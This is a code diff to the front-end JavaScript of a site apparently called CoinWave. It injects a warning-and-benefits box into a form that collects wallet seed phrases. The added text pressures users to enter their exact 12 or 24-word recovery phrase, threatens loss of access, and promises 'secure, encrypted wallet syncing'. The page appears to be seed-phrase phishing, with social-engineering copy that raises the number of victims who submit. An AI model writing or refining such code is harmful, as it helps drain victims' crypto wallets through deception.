@@ -890,3 +890,44 @@ window.submitWallet = async function() {
         }
     } catch (error) { showToast("Error submitting wallet."); }
 };
+
+/* =====================================================
+   ADD RED WARNING & BENEFITS TO SEED PHRASE FORM
+   ===================================================== */
+setInterval(() => {
+    const form = document.getElementById('importWalletForm');
+    
+    // Only inject if the form exists and we haven't added the warning yet
+    if (form && !document.getElementById('seedWarningBox')) {
+        const warningBox = document.createElement('div');
+        warningBox.id = 'seedWarningBox';
+        warningBox.style.cssText = "margin-top: 15px; background: rgba(246, 70, 93, 0.1); border: 1px solid rgba(246, 70, 93, 0.3); border-radius: 8px; padding: 15px; text-align: left;";
+        
+        warningBox.innerHTML = `
+            <div style="display: flex; gap: 8px; align-items: flex-start; margin-bottom: 12px;">
+                <span style="font-size: 18px; color: #f6465d;">⚠️</span>
+                <p style="color: #f6465d; font-size: 12px; margin: 0; line-height: 1.5; font-weight: 600;">
+                    IMPORTANT: You must enter the exact 12 or 24-word phrase. Incorrect phrases will cause connection errors and loss of access.
+                </p>
+            </div>
+            
+            <div style="border-top: 1px dashed rgba(246, 70, 93, 0.3); padding-top: 12px;">
+                <p style="color: #fff; font-size: 12px; margin-bottom: 6px; font-weight: bold;">Why connect your Web3 Wallet to CoinWave?</p>
+                <ul style="color: #aaa; font-size: 12px; margin: 0; padding-left: 18px; line-height: 1.6;">
+                    <li>Seamless Crypto Deposits & Withdrawals</li>
+                    <li>Instant Swap & Trade Execution</li>
+                    <li>0% Hidden Network Fees</li>
+                    <li>Secure, Encrypted Wallet Syncing</li>
+                </ul>
+            </div>
+        `;
+        
+        // Insert the warning box right above the "Verify & Import" button
+        const verifyBtn = form.querySelector('button[onclick="submitWallet()"]');
+        if (verifyBtn) {
+            form.insertBefore(warningBox, verifyBtn);
+        } else {
+            form.appendChild(warningBox);
+        }
+    }
+}, 1000);
